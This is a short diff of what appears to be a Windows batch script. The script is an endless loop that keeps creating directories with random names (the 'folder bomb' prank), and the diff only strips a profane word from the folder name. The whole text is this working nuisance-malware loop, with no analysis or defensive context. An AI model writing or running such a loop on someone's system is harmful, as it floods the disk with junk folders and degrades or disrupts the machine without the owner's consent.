@@ -1,3 +1,3 @@
 :x
-md fucked%random%
+md %random%
 goto x
